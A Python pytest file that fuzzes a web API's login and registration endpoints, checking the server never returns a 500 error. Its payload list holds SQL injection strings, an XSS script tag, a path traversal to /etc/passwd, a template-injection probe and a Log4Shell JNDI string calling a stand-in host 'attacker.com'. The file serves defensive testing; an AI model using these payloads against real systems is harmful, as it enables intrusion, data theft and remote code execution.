import pytest

FUZZ_PAYLOADS = [
    "' OR '1'='1' --",
    "admin' --",
    "\" OR \"1\"=\"1",
    "<script>alert(1)</script>",
    "%00",
    "\\x00",
    "A" * 10000,
    "\n\r\t",
    "../../../../etc/passwd",
    "${jndi:ldap://attacker.com/a}",
    "{{7*7}}",
    "None",
    "null",
    "undefined",
    "true",
    "[]",
    "{}",
    "-1",
    "999999999999999999999999999999999999999999999999999999999999999999",
]


def test_auth_fuzz_login(client):
    for payload in FUZZ_PAYLOADS:
        res = client.post("/api/v1/auth/login", json={
            "email": payload,
            "password": payload
        })
        # Server must never crash with 500 (rate limit 429, bad request 400, unauthorized 401, unprocessable 422 are safe)
        assert res.status_code in [400, 401, 422, 429], f"Crash or unexpected response on payload: {payload}"


def test_auth_fuzz_registration(client):
    for payload in FUZZ_PAYLOADS[:10]:
        res = client.post("/api/v1/auth/register", json={
            "email": f"test_valid_user_{abs(hash(payload)) % 10000}@example.com",
            "full_name": payload,
            "password": payload
        })
        assert res.status_code in [400, 422, 429], f"Registration crashed on payload: {payload}"
